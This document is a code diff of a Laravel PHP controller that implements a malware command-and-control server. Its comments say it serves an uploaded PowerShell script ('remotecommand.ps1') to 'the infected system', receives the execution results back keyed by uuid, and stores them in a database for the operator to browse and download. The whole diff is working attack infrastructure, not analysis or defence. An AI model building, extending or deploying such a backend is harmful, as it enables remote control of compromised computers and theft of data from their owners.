@@ -2,7 +2,7 @@
 
 namespace App\Http\Controllers;
 
-
+use App\Script;
 use Illuminate\Http\Request;
 
 class HomeController extends Controller
@@ -12,32 +12,10 @@ class HomeController extends Controller
         return view('home');
     }
 
-    public function upload(Request $request)
-    {
-        $file = $request->file('result');
-        // $file = $request->input('Name');
-        //Move Uploaded File
-        //$destinationPath = 'uploads';
-        //$file->move($destinationPath,$file->getClientOriginalName());
-        
-        $file->move(public_path('storage/results'),
-            $file . ".txt"//.$file->getClientOriginalExtension())
-        );
-
-        $response = [
-            'msg'               => 'Upload successfull',
-        ];
-
-        return $response;
-    }
-
+    // Store uploaded new script by user
     public function store(Request $request)
     {
         $file = $request->file('file');
-        //Move Uploaded File
-        //$destinationPath = 'uploads';
-        //$file->move($destinationPath,$file->getClientOriginalName());
-        
         $path = $file->move(public_path('storage/upload'),
             //date("Y.m.d.H.i.s".".".$file->getClientOriginalExtension()
             'remotecommand.'.$file->getClientOriginalExtension()
@@ -45,15 +23,52 @@ class HomeController extends Controller
         return view('home', compact('file', 'path'));
     }
 
-    public function json(Request $request)
+    // Store uploaded result (from executing the DLed script by the infected system)
+    public function upload(Request $request)
     {
-        $json = $request->input('json');
-        return view('home', compact('json'));
+        //$saveDirectory = public_path('storage/results/');
+        $fileContent = $request['fileContent'];
+        if (isset($fileContent) && $request['uuid']){
+            //file_put_contents($saveDirectory . $request['uuid'] . date("Y.m.d.H.i.s") . '.txt', $fileContent);
+            $script = new Script;
+            $script->uuid = $request->uuid;
+            $script->content = $fileContent;
+            $script->save();
+            $response = [
+                'msg'   => 'Upload successfull',
+            ];
+
+            return $response;
+        }
+
+        $response = [
+            'msg'   => 'Upload failed'
+        ];
+        return $response;
     }
 
+    // Give the new script to the infected system
     public function download()
     {
         $path = public_path('storage/upload/remotecommand.ps1');
         return response()->download($path);
+    }
+
+    // show logs with pagination
+    public function showLog()
+    {
+        $logs = Script::paginate(10);//orderBy('created_at', 'desc')->get();
+        return view('log', [
+            'logs' => $logs
+        ]);
+    }
+
+
+    public function dllog($id)
+    {
+        $log = Script::find($id);
+        $log_content = $log->content;
+        file_put_contents(public_path('log.txt'), $log_content);
+        return response()->download(public_path('log.txt'));
     }
 }
